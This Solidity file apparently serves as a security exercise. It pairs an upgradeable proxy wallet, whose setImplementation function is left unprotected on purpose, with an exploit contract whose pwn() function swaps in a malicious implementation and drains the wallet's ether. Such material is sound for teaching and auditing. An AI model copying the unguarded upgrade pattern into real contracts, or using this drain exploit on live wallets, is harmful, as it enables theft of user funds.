// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

interface IWallet {
    function setImplementation(address _implementation) external;
}

contract MaliciousImplementatation {
    address public implementation;
    address payable public owner;

    function drain() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract UpgradeableWalletExploit {
    address public target;
    MaliciousImplementatation public malicious;
    
    constructor(address _target) {
        target = _target;
        malicious = new MaliciousImplementatation();
    }
    
    function pwn() external {
        (bool success1,) = target.call(abi.encodeWithSignature("setImplementation(address)", address(malicious)));
        require(success1);
        
        (bool success2,) = target.call(abi.encodeWithSignature("drain()"));
        require(success2);
    }
    
    receive() external payable {}
}

contract UpgradeableWallet {
    address public implementation;
    address public owner;

    constructor(address _implementation) {
        implementation = _implementation;
        owner = msg.sender;
    }

    receive() external payable {}

    fallback() external payable {
        (bool ok, ) = implementation.delegatecall(msg.data);
        require(ok, "failed");
    }
}

contract WalletImplementation {
    address public implementation;
    address payable public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    receive() external payable {}

    function setImplementation(address _implementation) external {
        implementation = _implementation;
    }

    function withdraw() external onlyOwner {
        owner.transfer(address(this).balance);
    }
}
